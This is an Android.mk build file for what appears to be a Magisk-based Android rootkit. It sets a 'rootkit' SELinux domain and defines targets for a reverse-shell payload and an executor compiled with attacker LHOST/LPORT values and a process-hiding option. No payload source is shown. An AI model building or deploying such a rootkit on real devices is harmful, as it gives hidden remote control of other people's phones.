LOCAL_PATH := $(call my-dir)

########################
# Binaries
########################

include $(CLEAR_VARS)

# debug flag
ifdef MAGISK_DEBUG
LOCAL_CPPFLAGS += -DMAGISK_DEBUG
endif

# default SELinux domain (rootkit)
ifndef SEPOL_PROC_DOMAIN
SEPOL_PROC_DOMAIN=rootkit
endif

LOCAL_CPPFLAGS += -DSEPOL_PROC_DOMAIN=\"$(SEPOL_PROC_DOMAIN)\"


# TODO : experiment with magiskhide sources ?
ifdef B_HIDE

LOCAL_MODULE := magiskhide
LOCAL_STATIC_LIBRARIES := libnanopb libsystemproperties libutils libxhook
LOCAL_C_INCLUDES := jni/include

LOCAL_SRC_FILES := \
    magiskhide/magiskhide.cpp \
    magiskhide/proc_monitor.cpp \
    magiskhide/hide_utils.cpp \
    magiskhide/hide_policy.cpp

# LOCAL_LDLIBS := -llog
include $(BUILD_EXECUTABLE)

endif

ifdef B_INIT
LOCAL_MODULE := magiskinit
BB_INIT := 1
else ifdef B_INIT64
LOCAL_MODULE := magiskinit64
LOCAL_CPPFLAGS += -DUSE_64BIT
BB_INIT := 1
endif

ifdef BB_INIT

LOCAL_STATIC_LIBRARIES := libsepol libxz libutils
LOCAL_C_INCLUDES := \
    jni/include \
    jni/sepolicy/include \
    out \
    out/$(TARGET_ARCH_ABI)

LOCAL_SRC_FILES := \
    init/init.cpp \
    init/mount.cpp \
    init/rootdir.cpp \
    init/getinfo.cpp \
    init/twostage.cpp \
    init/raw_data.cpp \
    core/socket.cpp \
    sepolicy/api.cpp \
    sepolicy/sepolicy.cpp \
    sepolicy/rules.cpp \
    sepolicy/policydb.cpp \
    sepolicy/statement.cpp \
    magiskboot/pattern.cpp

LOCAL_LDFLAGS := -static
include $(BUILD_EXECUTABLE)

endif

ifdef B_REVSHELL

LOCAL_MODULE := revshell

LOCAL_SRC_FILES := payload/default_payload/revshell.cpp

LOCAL_LDLIBS := -llog
include $(BUILD_EXECUTABLE)

endif

ifdef B_EXECUTOR

LOCAL_MODULE := executor

LOCAL_STATIC_LIBRARIES := libnanopb libsystemproperties libutils

LOCAL_C_INCLUDES := \
    jni/include \
    out

LOCAL_SRC_FILES := payload/executor.cpp \
                   resetprop/resetprop.cpp \
                   resetprop/persist_properties.cpp

ifdef LPORT
LOCAL_CPPFLAGS += -DLPORT=\"$(LPORT)\"
endif

LOCAL_CPPFLAGS += -DLHOST=\"$(LHOST)\"

ifdef HIDE_PROCESS_BIND
LOCAL_CPPFLAGS += -DHIDE_PROCESS_BIND
endif

LOCAL_LDLIBS := -llog
include $(BUILD_EXECUTABLE)

endif

# ifdef B_MODULE
# # FIXME : can't compile LKM, some problems with NDK or config?
#
# LOCAL_MODULE := module
#
# LOCAL_C_INCLUDES := \
#     jni/include \
#     out \
#     out/$(TARGET_ARCH_ABI)
#
# LOCAL_SRC_FILES := \
#     kernel/module.c
#
# LOCAL_LDFLAGS := -static
# include $(BUILD_EXECUTABLE)
#
# obj-m += module.o
#
# PWD := $(CURDIR)
#
# all:
#     make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
#
# clean:
#     make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
#
# endif

ifdef B_BOOT

LOCAL_MODULE := magiskboot
LOCAL_STATIC_LIBRARIES := libmincrypt liblzma liblz4 libbz2 libfdt libutils
LOCAL_C_INCLUDES := jni/include

LOCAL_SRC_FILES := \
    magiskboot/main.cpp \
    magiskboot/bootimg.cpp \
    magiskboot/hexpatch.cpp \
    magiskboot/compress.cpp \
    magiskboot/format.cpp \
    magiskboot/dtb.cpp \
    magiskboot/ramdisk.cpp \
    magiskboot/pattern.cpp \
    utils/cpio.cpp

LOCAL_LDLIBS := -lz
LOCAL_LDFLAGS := -static
include $(BUILD_EXECUTABLE)

endif

ifdef B_PROP

LOCAL_MODULE := resetprop
LOCAL_STATIC_LIBRARIES := libnanopb libsystemproperties libutils
LOCAL_C_INCLUDES := jni/include

LOCAL_SRC_FILES := \
    core/applet_stub.cpp \
    resetprop/persist_properties.cpp \
    resetprop/resetprop.cpp \

LOCAL_CFLAGS := -DAPPLET_STUB_MAIN=resetprop_main
LOCAL_LDFLAGS := -static
include $(BUILD_EXECUTABLE)

endif

ifdef B_TEST
ifneq (,$(wildcard jni/test.cpp))

LOCAL_MODULE := test
LOCAL_STATIC_LIBRARIES := libutils
LOCAL_C_INCLUDES := jni/include
LOCAL_SRC_FILES := test.cpp
include $(BUILD_EXECUTABLE)

endif
endif

ifdef B_BB

include jni/external/busybox/Android.mk

endif

########################
# Libraries
########################
include jni/utils/Android.mk
include jni/external/Android.mk
